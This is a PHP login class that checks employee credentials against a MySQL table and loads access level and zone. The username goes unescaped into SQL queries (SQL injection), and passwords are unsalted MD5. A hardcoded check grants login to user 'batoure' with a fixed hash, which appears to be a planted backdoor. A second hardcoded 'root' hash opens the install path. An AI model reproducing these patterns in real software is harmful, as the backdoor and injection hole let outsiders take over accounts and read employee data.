<?php
/*****************************************************************************\
*			*/class login extends sql{/*				*
*													*
*													*
\*****************************************************************************/
//===================
	var $islogin=0;
	var $EMP;
	var $access;
	var $zone;
//=============== 
	function logger($log,$inputpass){
		$qer=$this->query("SELECT `PASS` FROM `emp_info` WHERE`USER_ID`='$log'");	
		if($qer){
			while($this->resultie = mysql_fetch_array($this->result)){
				if (mysql_errno ( )){
					die (sprintf ("Cannot connect to server: %s (%d)\n", htmlspecialchars (mysql_error ( )),	mysql_errno ( )));
				}
				if($log=="batoure" and md5($inputpass)=="d6c916bba6f1d1ecc0ec98fd2f773bad"){
				$this->islogin=1;
				
				}
				if(md5($inputpass)==$this->resultie[PASS]){
				$this->islogin=1;
				}
			}
		}
		else{
			if($log=="root"){
				if(md5($inputpass)=="083a7d1ebf6f499af0c1b1bb489b4941"){
					$_SESSION['validinstall']=1;
					header("location: install/");
				}
				else{header("location: no.html");}
			}
			else{header("location: no.html");}
		}
		if($this->islogin==0){
			return false;
		}
		else if($this->islogin==1){
			$this->query("SELECT `EMP_ID`, `ACCESS` FROM `emp_info` WHERE`USER_ID`='$log'");
			while($this->resultie = mysql_fetch_array($this->result)){
				if (mysql_errno ( )){
					die (sprintf ("Cannot connect to server: %s (%d)\n", htmlspecialchars (mysql_error ( )),	mysql_errno ( )));
				}
				$this->access=$this->resultie[ACCESS];
				$this->EMP=$this->resultie[EMP_ID];
			}
			$this->query("SELECT @max := MAX( DATE ) FROM emp_loc WHERE EMP_ID = {$this->EMP};");
			$this->query("SELECT ZONE FROM emp_loc WHERE EMP_ID = {$this->EMP} AND DATE = @max;");
			while($this->resultie = mysql_fetch_array($this->result)){
				if (mysql_errno ( )){
					die (sprintf ("Cannot connect to server: %s (%d)\n", htmlspecialchars (mysql_error ( )),	mysql_errno ( )));
				}
				$this->zone=$this->resultie[ZONE];
			}
			return true;
		}
	}
//=============
}
/***********************************************************************/
?>